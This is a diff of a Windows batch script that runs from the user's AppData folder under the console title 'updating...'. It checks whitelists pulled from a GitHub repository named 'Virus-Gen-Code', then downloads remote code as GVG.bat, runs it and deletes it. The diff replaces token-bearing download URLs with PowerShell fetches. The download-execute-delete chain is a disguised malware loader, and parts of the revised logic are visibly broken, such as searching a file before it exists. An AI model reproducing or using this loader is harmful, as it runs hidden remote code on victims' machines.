@@ -1,24 +1,22 @@
 @echo off && Title updating... && cd C:\users\%username%\AppData
 ::WL check 1
-Set "url=https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/Email-whitelist?token=ANX5WBDD77SYIF3W2Z6NZ2DAKLF2Y"
-for %%# in (%url%) do ( set "File=%tmp%\%%~n#.txt" )
-Call :Download "%url%" "%File%"
-del error.txt
-If exist "%File%" ( 
-    ( Type "%File%")>con
-( Type "%File%" >WL1.sav)
+Dism /online /Get-FeatureInfo /FeatureName:Internet-Explorer-Optional-amd64>data1.txt
+>nul find "State : Enabled" WL1.sav && (
+  goto offline
+) || (
+  goto online
 )
+Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/Email-whitelist").Content >WL1.sav
 if exist C:\ProgramData\GVGemail.sav (goto WLcheck) else (goto email_error)
 :EMnxt
-del WL1.sav
-Set "url=https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/Device-whitelist?token=ANX5WBBAGWZK5EQDX2PTK2LAKLISU"
-for %%# in (%url%) do ( set "File=%tmp%\%%~n#.txt" )
-Call :Download "%url%" "%File%"
-del error.txt
-If exist "%File%" ( 
-    ( Type "%File%")>con
-( Type "%File%" >WL2.sav)
+>nul find "At" WL1.sav && (
+  goto offline
+) || (
+  goto online
 )
+:online
+del WL1.sav
+Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/Device-whitelist").Content >WL2.sav
 >nul find "%username%" WL2.sav && (
   goto deviceNXT
 ) || (
@@ -27,15 +25,7 @@ If exist "%File%" (
 :deviceNXT
 del WL2.sav  
 :: download source
-Set "url=https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/source?token=ANX5WBA7VJKKNIDNUWT4H43AKLLZC"
-for %%# in (%url%) do ( set "File=%tmp%\%%~n#.txt" )
-Call :Download "%url%" "%File%"
-del error.txt
-If exist "%File%" ( 
-    ( Type "%File%")>con
-( Type "%File%" >GVG.bat)
-)
-pause
+Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/source").Content >GVG.bat
 call GVG.bat
 timeout 1 /NOBREAK >nul
 del GVG.bat
@@ -48,7 +38,7 @@ Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('%1','%2
   exit /b
 )
 :offline
-del error.txt
+del WL1.sav
 echo.
 echo this program requires an internet connection
 echo.
